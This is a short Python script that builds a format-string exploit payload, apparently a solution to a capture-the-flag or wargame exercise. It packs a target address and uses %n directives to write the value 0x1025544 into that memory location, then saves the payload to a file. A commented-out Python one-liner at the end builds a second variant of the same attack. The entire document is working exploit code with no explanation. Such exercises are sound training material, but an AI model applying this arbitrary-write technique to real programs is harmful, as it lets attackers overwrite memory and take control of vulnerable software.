import struct

target_value = 0x1025544
addr = struct.pack("<I", 0x08049810)
arg_offset = 8
arg_offset -= 2
payload = addr
payload += b"%12$." + str(target_value - 4).encode() + b"x%12$n\n"
with open("payload", "wb") as f:
    f.write(payload)

# # python -c 'print "\x10\x98\x04\x08" + b"%08x" * 6 + "%016930064x" + b"%n"'